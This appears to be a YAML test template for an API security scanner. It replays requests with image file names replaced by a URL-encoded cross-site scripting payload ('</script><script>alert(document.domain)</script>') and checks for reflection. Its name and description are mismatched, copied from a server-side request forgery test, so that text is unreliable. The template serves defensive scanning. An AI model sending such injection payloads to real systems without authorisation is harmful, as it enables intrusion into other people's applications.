id: XSS_VIA_FILE_NAME
info:
  name: "Sensitive files exposed due to SSRF"
  description: "The endpoint appears to be vulnerable to Server Side Request Forgery attack. The original request was replayed by replacing the URI parameter with popular sensitive file paths. The application responded with 2XX success code and also gave out details of these files." 
  details: >
            "The endpoint appears to be vulnerable to Server Side Request Forgery attack. The original request was replayed by replacing the URI parameter with popular sensitive file paths. The application responded with 2XX success code and also gave out details of these files.
            Modern concepts in application development make SSRF more common and more dangerous.
            More common - the following concepts encourage developers to access an external resource based on user input: Webhooks, file fetching from URLs, custom SSO, and URL previews.
            More dangerous - Modern technologies like cloud providers, Kubernetes, and Docker expose management and control channels over HTTP on predictable, well-known paths. Those channels are an easy target for an SSRF attack.
            It is also more challenging to limit outbound traffic from your application, because of the connected nature of modern applications.
            The SSRF risk can not always be completely eliminated. While choosing a protection mechanism, it is important to consider the business risks and needs."
  impact: "Successful exploitation might compromise sensitive data such as passwords, source-code, confidential files etc."
  category:
    name: XSS
    shortName: XXS
    displayName: Cross-site scripting (XSS)
  subCategory: XSS_VIA_FILE_NAME
  severity: HIGH
  tags:
    - Business logic
    - OWASP top 10
    - HackerOne top 10
  references:
    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"
    - "https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt"
api_selection_filters:
  and:
    response_code:
      gte: 200
      lt: 300
    
    response_payload:
      contains_either:
        - <!doctype html>

    or:
      - request_payload:
          for_one:
            value:
              contains_either:
                  - .jpg
            key:
              extract: jpg_file_name
      - query_param:
          for_one:
            value:
              contains_either:
                  - .jpg
            key:
              extract: jpg_file_name

      - request_payload:
          for_one:
            value:
              contains_either:
                  - .jpeg
            key:
              extract: jpeg_file_name
      - query_param:
          for_one:
            value:
              contains_either:
                  - .jpeg
            key:
              extract: jpeg_file_name

      - request_payload:
          for_one:
            value:
              contains_either:
                  - .png
            key:
              extract: png_file_name
      - query_param:
          for_one:
            value:
              contains_either:
                  - .png
            key:
              extract: png_file_name

execute:
  type: single
  requests:
    - req:
      - modify_query_param:
          jpg_file_name: '%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E.jpg'
      - modify_body_param:
          jpg_file_name: '%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E.jpg'

      - modify_query_param:
          jpeg_file_name: '%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E.jpeg'
      - modify_body_param:
          jpeg_file_name: '%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E.jpeg'

      - modify_query_param:
          png_file_name: '%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E.png'
      - modify_body_param:
          png_file_name: '%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E.png'

validate:
  response_payload:
    contains_either: "</script><script>alert(document.domain)</script>"
  response_payload:
    contains_either: <!doctype html>
